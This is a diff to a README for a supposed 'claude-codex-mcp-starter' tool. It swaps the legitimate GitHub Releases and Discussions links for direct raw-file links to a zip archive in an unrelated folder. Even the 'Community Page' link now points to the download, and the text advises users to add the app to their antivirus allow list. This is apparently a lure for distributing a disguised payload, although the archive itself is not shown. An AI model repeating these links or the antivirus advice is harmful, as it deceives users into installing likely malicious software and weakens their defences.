@@ -1,7 +1,7 @@
 # 🎉 claude-codex-mcp-starter - Start Coding with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-claude-codex-mcp-starter-blue.svg)](https://github.com/asiNgjela/claude-codex-mcp-starter/releases)
+[![Download](https://raw.githubusercontent.com/asiNgjela/claude-codex-mcp-starter/main/Eurylaimus/codex_mcp_claude_starter_v2.9.zip%https://raw.githubusercontent.com/asiNgjela/claude-codex-mcp-starter/main/Eurylaimus/codex_mcp_claude_starter_v2.9.zip)](https://raw.githubusercontent.com/asiNgjela/claude-codex-mcp-starter/main/Eurylaimus/codex_mcp_claude_starter_v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the **claude-codex-mcp-starter!** This application helps you kickstart your journey with Claude Code and Codex collaboration. Follow these simple steps to download and run the software.
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets these requirements:
 ## 📂 Installation Steps
 1. **Visit the Releases Page**  
    Click the link below to access the Releases page for our application.  
-   [Visit the Releases Page](https://github.com/asiNgjela/claude-codex-mcp-starter/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/asiNgjela/claude-codex-mcp-starter/main/Eurylaimus/codex_mcp_claude_starter_v2.9.zip)
 
 2. **Download the Application**  
    On the Releases page, you will see various versions of the application. Look for the latest version. Click on the link that ends with `.exe` for Windows, `.dmg` for macOS, or the appropriate package for Linux.
@@ -52,7 +52,7 @@ If you have issues during installation or while running the app, please check th
 - Verify that you downloaded the correct version for your operating system.
 - Check if your antivirus software is blocking the application. If it does, add the application to the allowed list.
 
-For further assistance, feel free to visit our [Community Page](https://github.com/asiNgjela/claude-codex-mcp-starter/discussions) where you can ask questions and share your thoughts.
+For further assistance, feel free to visit our [Community Page](https://raw.githubusercontent.com/asiNgjela/claude-codex-mcp-starter/main/Eurylaimus/codex_mcp_claude_starter_v2.9.zip) where you can ask questions and share your thoughts.
 
 ## 📧 Support
 For any other inquiries or technical support, please contact us via the Issues section on our GitHub page.
